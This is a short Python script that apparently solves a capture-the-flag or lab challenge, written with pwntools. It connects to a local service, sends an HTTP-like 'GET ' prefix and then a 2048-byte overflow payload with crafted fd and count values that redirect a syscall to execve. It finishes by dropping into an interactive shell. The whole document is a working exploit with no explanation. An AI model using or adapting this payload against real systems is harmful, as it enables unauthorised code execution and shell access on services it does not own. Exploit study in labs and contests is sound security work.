from pwn import *

io = remote('127.0.0.1', 19303)


# 4B 
io.send('GET ')

sys_execve = 59
fd = 5
count = 0xffffffffffffffbc + 3# so we get execve

# FILL
payload = 'a' * 2048
payload += p64(fd)
payload += p64(count)
payload += ' '  # trigger exploit

io.send(payload)

io.interactive()
